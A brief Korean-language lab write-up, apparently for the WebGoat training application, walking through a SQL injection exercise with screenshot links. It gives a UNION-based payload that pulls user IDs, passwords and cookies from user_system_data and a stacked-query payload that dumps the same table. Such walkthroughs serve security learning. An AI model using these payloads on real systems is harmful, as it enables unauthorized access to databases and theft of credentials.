<h3>테이블에 Dave가 없어서 결과가 나오지 않음</h3>

![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/df3778ee-df03-4457-8d5c-924233342af0)<hr>
위의 테이블 형식과는 달리 7개의 attribute로 이루어진 테이블인걸 확인<br>
![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/f19a0a48-7b5e-4bd6-8563-9a1ae9651590)<hr>
Union을 이용해서 위의 테이블과 밑의 테이블을 강제로 합침<br>
Smith' union select userid, user_name, password, cookie, null, null, null  from user_system_data where 1=1 --를 입력<br>
![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/768f7aed-f60d-43f2-9405-41126937cb84)<hr>
Dave의 패스워드를 입력<br>
![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/03ad857e-7714-4fc3-9f51-5070b90f6061)<hr>

'; select *  from user_system_data --  를 입력<br>
![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/6d4f045b-2e95-46ef-a41f-43749b3c9eb9)




